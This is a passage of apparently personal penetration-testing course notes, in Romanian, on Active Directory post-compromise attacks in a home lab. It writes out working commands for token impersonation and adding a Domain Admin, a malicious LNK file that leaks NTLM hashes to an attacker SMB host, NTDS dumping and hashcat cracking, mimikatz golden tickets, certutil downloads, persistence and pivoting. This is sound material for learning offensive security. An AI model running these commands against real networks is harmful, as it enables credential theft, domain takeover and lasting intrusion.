meterpreter > impersonate_token MARVEL\\fcastle
[+] Delegation token available
[+] Successfully impersonated user MARVEL\fcastle
```
![README-2025-12-05-14-15-45.png](../src/img/README-2025-12-05-14-15-45.png)
In cazul in care este logat administratorul putem deveni administrator luand tokenul acestuia:

```bash
use exploit/windows/smb/psexec
set options
exploit
load incognito #aici si are loc incarcarea modulului care ne permite manipularea cu tickete dupa rulam
help #aici trebuie sa vedem toate comenzile care sunt + comenzile care tin de incognito
list_tokens -u 
impersonat_token MARVEL\\administrator
shell
whoami # aici daca am facut correct trebuie sa vedem ca suntem marvel\administrator
net user /add howkeye Password1@ /domain # putem si adauga un user nou pentru ulterios sa ne logam ca el 
net group "Domain Admins" howkeye /ADD /DOMAIN #adaugam ca admin la AD 
```
![README-2025-12-04-13-46-18.png](../src/img/README-2025-12-04-13-46-18.png)

Am realizat acest attac in laboratorul personal:

### Token Impersonation Mitigation:
Strategii de mitigare:
• Limitarea permisiunilor pentru crearea token-urilor de către utilizatori/grupuri
• Separarea pe niveluri a conturilor (account tiering)
• Restricționarea accesului de administrator local

### LNK File attacks:
Un LNK file este un fișier shortcut Windows.
Când utilizatorul deschide sau chiar pre-vizualizează .lnk-ul, Windows:
- încearcă să acceseze resursa țintă (TargetPath)
- dacă targetul este pe o rețea SMB (\IP\share)
- Windows trimite automat credențiale NTLM către serverul SMB

Crearea unui LNK malițios:
```power shell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```
Atac automat — folosind CME / NetExec:
```bash
netexec smb <IP> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<IP>
```

Ce face?

        Rulează modulul slinky din NetExec (succesori CME)
        Creează automat un shortcut .lnk malițios pe sistemul țintă
        TargetPath va arăta spre \\SERVER_IP\NAME

În exemplu:

LNK-ul creat se numește test

Serverul SMB al atacatorului este 192.168.138.149

Când utilizatorul logat pe sistemul vulnerabil:

- apasă pe shortcut
- un program accesează shortcutul
- File Explorer îl pre-randează

Windows trimite automat:

        NTLMv2 hash
        utilizator
        domeniu
        challenge token


Un resurse foate util cu asa tip de attack cum facem prin word [Link](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)

#TODO need to try to do this attack 


### GPP / cPasswrod Attacks and Mitigations:
Prezentare generală
• Group Policy Preferences (GPP) a permis administratorilor să creeze politici care conțineau credențiale integrate
• Aceste credențiale erau criptate și plasate într-un câmp numit „cPassword”
• Cheia de decriptare a fost publicată accidental (ups)
• Problema a fost reparată în MS14-025, dar asta nu previne utilizările mai vechi
• ÎNCĂ RELEVANT ÎN PENTESTING

Este un tip de attac foarte vechi practica la el nu o sa fie:
![README-2025-12-05-14-24-08.png](../src/img/README-2025-12-05-14-24-08.png)

### Mimikatz Overview:
Prezentare generală
• Unealtă folosită pentru a vizualiza și fura credențiale, a genera tichete Kerberos și a lansa diverse atacuri
• Extrage (dump) credențialele stocate în memorie
• Câteva dintre atacuri: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Silver Ticket și Golden Ticket


### Credential Dumping with Mimikatz:
Utilita se afla pe [github](https://github.com/gentilkiwi/mimikatz) se poate face download [here](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919) 

![README-2025-12-04-14-38-57.png](../src/img/README-2025-12-04-14-38-57.png)

#todo try this attack 

### Post-Compromise Attack Strategy:
![README-2025-12-04-14-51-24.png](../src/img/README-2025-12-04-14-51-24.png)

`PAM`           - Privilege Access Management

## We've Compromised the Domain - Now What?:
### Post-Domain Compromise Attack Strategy:
![README-2025-12-04-15-01-48.png](../src/img/README-2025-12-04-15-01-48.png)
#todo text 

### Dumping the NTDS.dit:
![README-2025-12-04-15-08-10.png](../src/img/README-2025-12-04-15-08-10.png)

```bash
secretsdump.py MARVEL.local/howkeye:'Password1@'@<fcastle_IP> -just-dc-ntlm #todo run this attack and check 
```
#todo Extragem toate hashurile si pe urma le cracuim cu hashcat 
```bash
hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt --show 
```

### Golden Ticket Attacks Overview:

Ce este?
• Când compromitem contul krbtgt, practic deținem întregul domeniu
• Putem solicita acces la orice resursă sau sistem din domeniu
• Golden tickets = acces complet la fiecare mașină din domeniu

Obținerea hash-ului krbtgt cu Mimikatz:
Pentru a crea un Golden Ticket, trebuie să extragem hash-ul NTLM al contului krbtgt.
Acest cont este responsabil pentru semnarea tuturor biletelor Kerberos din domeniu.
Dacă îl compromitem → putem genera tichete valide pentru orice user.

### Golden Ticket Attacks:
```bash
mimikatz# ptivilege::debug 
mimikatz# lsadump::lsa /inject /name:krbtgt 
#trebuei sa primim ticketele de kerberos
....

....
mimikatz# kerberos::golden /User:Administrator /domain:marvel.local /sid:<mimikatz# lsadump::lsa /inject /name:krbtgt -> this return our sid> /krbtgt:<ticket_admin> /id:500 /ppt 
misc::cmd #will open new prompt a simple cmd from this user
```
#TODO try to make this attack 

## Additional Active Directory Attacks:
### Section Overview:
Prezentare generală
• Vulnerabilitățile Active Directory apar în mod constant.
• Câteva vulnerabilități majore recente includ:
 • ZeroLogon
 • PrintNightmare
 • Sam the Admin
• Merită să verifici existența acestor vulnerabilități, dar nu ar trebui să încerci să le exploatezi fără aprobarea clientului

### Abusing ZeroLogon:
What is [ZeroLogon?](https://www.trendmicro.com/en_us/what-is/zerologon.html)
dirkjanm [CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472) - #todo check if we can run this attack make snapshot before https://github.com/dirkjanm/CVE-2020-1472 we can run this scripts
SecuraBV [ZeroLogon Checker](ttps://github.com/SecuraBV/CVE-2020-1472)

### PrintNightmare (CVE-2021-1675):
[cube0x0 RCE](https://github.com/cube0x0/CVE-2021-1675)
[calebstewart LPE](https://github.com/calebstewart/CVE-2021-1675)
#todo try this attack on AC  https://academy.tcm-sec.com/courses/1152300/lectures/33637715

## Active Directory Case Studies:
[AD Case Study #1](https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security/) 
[AD Case Study #2](https://tcm-sec.com/pentest-tales-002-digging-deep)
AD Case Study #3 - FNew Macbook Pro Setup Procedure 

## Post Exploitation:
### File Transfers:
- Certutil 
```bash
certutil.exec -urlcache -f http://<IP_addres>/file.txt file.txt
```
- HTTP
```bash
python -m SimpleHttpServer 80
```
- FTP
```bash
python -m pyftpdlib 21 (attacker machine)
```
### Maintaining Access:
• Scripturi de persistență
 • run persistence -h
 • exploit/windows/local/persistence
 • exploit/windows/local/registry_persistence

• Task-uri programate (Scheduled Tasks)
 • run scheduleme
 • run schtaskabuse

• Adăugarea unui utilizator
 • net user hacker password123 /add

### Pivoting:
![README-2025-12-05-15-06-10.png](../src/img/README-2025-12-05-15-06-10.png)
```bash
cat /etc/proxychains4.conf #Aici trebuie specificat configuratiea 
ssh -f -N -D 9050 -i pivot root@10.10.155.5 #transmite traficul prin ssh port forwarding
proxychains nmap 10.10.10.5 #traficul o sa merga prin ssh si o cada la noi pe masina pe urma 
proxychains xfreerdp /u:administrator /p:'PASS' /v:10.10.10.225 
proxychains firefox
```

```bash
sudo pip install sshuttle
sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot" #todo de vazut ce face comanda data
#putem rula scanari la retea fara proxychains 
```
[chisel](https://github.com/jpillora/chisel) - 

### Cleaning UP:
• Readu sistemul/rețeaua la starea inițială, așa cum era înainte să intri
 • Elimină executabilele, scripturile și fișierele adăugate
 • Elimină malware-ul, rootkit-urile și conturile de utilizator create
 • Resetează setările la configurațiile originale

## Web Application Enumeration, Revisited:

### Installing Go:
```bash
git cloen https://github.com/Dewalt-arch/pimpmykali
cd pimpmykali
./pimpmykali.sh 
#aici trebuie sa alegem ce dorim sa facem instalam reparam sau alt ceva :)
```
###  Finding Subdomains with Assetfinder:
`assetfindr`                    - #todo descrierea la tool here 
https://github.com/tomnomnom/assetfinder  #todo install and run to now how it works 

### Finding Subdomains with Amass:
[`amass`](https://github.com/owasp-amass/amass)                         -#todo descrierea la tool here 
https://github.com/owasp-amass/amass #todo install and run to now how it works 

### Finding Alive Domains with Httprobe:
`Httprobe`                      -#

### Screenshotting Websites with GoWitness:
[GoWitness](https://github.com/sensepost/gowitness) -#todo descrierea la tool here 

### Scripting for automating enumerate:
sumrecon: https://github.com/thatonetester/sumrecon
TCM's modified script - https://pastebin.com/MhE6zXVt

### Additional Resources:
[The Bug Hunter's Methodolog](https://www.youtube.com/watch?v=uKWu6yhnhbQ)

[Nahamsec Recon Playlist](https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA)

## Find & Exploit Common Web Vulnerabilities:

###  Lab Setup (full text instructions included in course notes):
#todo set the labs
#aici Am ramas Domain Enumeration with Bloodhound #TODO
